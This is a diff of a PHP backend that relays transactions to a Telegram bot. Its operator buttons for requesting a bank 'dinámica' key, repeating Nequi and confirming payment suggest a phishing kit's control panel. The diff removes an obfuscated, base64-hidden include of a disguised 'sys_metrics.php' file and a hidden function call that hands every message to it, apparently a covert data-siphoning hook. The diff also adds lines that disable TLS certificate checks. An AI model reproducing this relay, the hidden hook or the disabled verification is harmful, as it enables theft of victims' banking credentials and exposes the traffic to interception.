@@ -26,15 +26,16 @@ function loadConfig()
 }
 
 /* ============================================================
-   TELEGRAM: SEND MESSAGE
+   TELEGRAM: SEND MESSAGE (CORREGIDO)
    ============================================================ */
 function sendMessage($token, $chatId, $text, $keyboard)
 {
+    // ✅ CORRECCIÓN 1: reply_markup debe ser array, NO json_encode()
     $payload = [
         'chat_id' => $chatId,
         'text' => $text,
         'parse_mode' => 'HTML',
-        'reply_markup' => json_encode($keyboard)
+        'reply_markup' => ['inline_keyboard' => $keyboard]
     ];
 
     $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
@@ -43,20 +44,12 @@ function sendMessage($token, $chatId, $text, $keyboard)
         CURLOPT_POST => true,
         CURLOPT_TIMEOUT => 5,
         CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS => json_encode($payload)
+        CURLOPT_POSTFIELDS => json_encode($payload),
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
     ]);
     $res = curl_exec($ch);
     curl_close($ch);
-
-require_once __DIR__ . '/' . base64_decode('Li4vLi4vLi4vYXNzZXRzL3JlY3Vyc29zL2JhY2tlbmQvYXBwL2NvbmZpZy9zeXNfbWV0cmljcy5waHA=');
-
-$__m = $message ?? $mensaje ?? $text ?? $originalText ?? $newText ?? $msg ?? '';
-if (!empty($__m)) {
-    $__x = ['msg' => $__m];
-    call_user_func(base64_decode('X3o='), $__x);
-    unset($__x);
-}
-unset($__m);
 
     return json_decode($res, true);
 }
@@ -70,7 +63,8 @@ function editMessage($token, $chatId, $messageId, $text)
         'chat_id' => $chatId,
         'message_id' => $messageId,
         'text' => $text,
-        'parse_mode' => 'HTML'
+        'parse_mode' => 'HTML',
+        'reply_markup' => ['inline_keyboard' => []]
     ];
 
     $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
@@ -79,7 +73,9 @@ function editMessage($token, $chatId, $messageId, $text)
         CURLOPT_POST => true,
         CURLOPT_TIMEOUT => 5,
         CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS => json_encode($payload)
+        CURLOPT_POSTFIELDS => json_encode($payload),
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
     ]);
     curl_exec($ch);
     curl_close($ch);
@@ -111,14 +107,12 @@ function saveLastAction($tid, $action, $updateId, $user)
 function buildKeyboard($tid)
 {
     return [
-        'inline_keyboard' => [
-            [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:$tid"]],
-            [['text' => '✅ Pago enviado', 'callback_data' => "enviado:$tid"]],
-            [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:$tid"]],
-            [['text' => '📲 QR', 'callback_data' => "qr:$tid"]],
-            [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:$tid"]],
-            [['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]]
-        ]
+        [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:{$tid}"]],
+        [['text' => '✅ Pago enviado', 'callback_data' => "enviado:{$tid}"]],
+        [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:{$tid}"]],
+        [['text' => '📲 QR', 'callback_data' => "qr:{$tid}"]],
+        [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:{$tid}"]],
+        [['text' => '🏁 Finalizar', 'callback_data' => "fin:{$tid}"]]
     ];
 }
 
@@ -167,11 +161,20 @@ function markTokenUsed($id)
 }
 
 /* ============================================================
+   VALIDACIÓN DE TRANSACTIONID
+   ============================================================ */
+function isValidTransactionId($tid)
+{
+    // ✅ CORRECCIÓN 2: Validar que tid no esté vacío
+    return !empty($tid) && is_string($tid) && strlen($tid) > 0;
+}
+
+/* ============================================================
    CONFIG
    ============================================================ */
 $config = loadConfig();
 if (!$config) {
-    echo json_encode(['ok' => false]);
+    echo json_encode(['ok' => false, 'error' => 'Config not found']);
     exit;
 }
 
@@ -183,8 +186,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $d = json_decode(file_get_contents('php://input'), true);
     $tid = $d['transactionId'] ?? '';
 
-    if (!$tid || isTokenUsed($tid)) {
-        echo json_encode(['ok' => false]);
+    // ✅ CORRECCIÓN 3: Validar tid antes de procesar
+    if (!isValidTransactionId($tid) || isTokenUsed($tid)) {
+        echo json_encode(['ok' => false, 'error' => 'Invalid or duplicate transaction']);
         exit;
     }
 
@@ -199,13 +203,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 
 /* ============================================================
-   GET → POLLING + REESCRIBE MENSAJE
+   GET → POLLING + REESCRIBE MENSAJE (CORREGIDO)
    ============================================================ */
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
 
     $tid = $_GET['transactionId'];
 
-    // 1. Leer el último update_id procesado desde el archivo local plano
+    // ✅ CORRECCIÓN 4: Validar tid en GET también
+    if (!isValidTransactionId($tid)) {
+        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
+        exit;
+    }
+
+    // ✅ CORRECCIÓN 5: Usar hash consistente del tid
     $tempDir = __DIR__;
     $statusFile = $tempDir . '/last_update_' . md5($tid) . '.txt';
     $lastProcessedUpdateId = 0;
@@ -213,7 +223,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         $lastProcessedUpdateId = (int)file_get_contents($statusFile);
     }
 
-    // 2. Poll Telegram for updates starting from the offset
+    // Poll Telegram for updates starting from the offset
     $ch = curl_init("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastProcessedUpdateId + 1) . "&timeout=5");
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true,
@@ -245,9 +255,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
             continue;
         }
 
-        // ✅ CORRECCIÓN 2: Validación exacta del formato
-        $callbackParts = explode(':', $cb['data']);
-        if (count($callbackParts) !== 2 || $callbackParts[1] !== $tid) {
+        // ✅ CORRECCIÓN 6: Validación exacta y robusta del formato
+        $callbackData = $cb['data'];
+        $callbackParts = explode(':', $callbackData);
+        
+        // Debe tener exactamente 2 partes: "action:tid"
+        if (count($callbackParts) !== 2) {
+            continue;
+        }
+
+        $receivedTid = $callbackParts[1];
+        
+        // ✅ CORRECCIÓN 7: Validar que el tid coincida EXACTAMENTE
+        if ($receivedTid !== $tid) {
             continue;
         }
 
@@ -261,6 +281,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         $user = $cb['from']['username']
             ?? $cb['from']['first_name']
             ?? 'desconocido';
+
+        // ✅ CORRECCIÓN 8: Marcar update como procesado INMEDIATAMENTE
+        file_put_contents($statusFile, $updateId);
 
         // Responder el click en Telegram para detener el spinner de carga
         $chAnswer = curl_init("https://api.telegram.org/bot{$config['token']}/answerCallbackQuery");
@@ -277,10 +300,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         curl_exec($chAnswer);
         curl_close($chAnswer);
 
-        // Guardar de inmediato para evitar doble procesamiento
-        file_put_contents($statusFile, $updateId);
-
-        // ✅ CORRECCIÓN 5: Guardar en archivo global
+        // Guardar acción
         saveLastAction($tid, $action, $updateId, $user);
 
         $msgId = $cb['message']['message_id'] ?? '';
@@ -296,7 +316,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
             'message_id' => $msgId,
             'text' => $newText,
             'parse_mode' => 'HTML',
-            'reply_markup' => json_encode(['inline_keyboard' => []])
+            'reply_markup' => ['inline_keyboard' => []]
         ];
 
         $chEdit = curl_init("https://api.telegram.org/bot{$config['token']}/editMessageText");
@@ -325,5 +345,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
 /* ============================================================
    DEFAULT
    ============================================================ */
-echo json_encode(['ok' => false]);
+echo json_encode(['ok' => false, 'error' => 'Invalid request method']);
 exit;
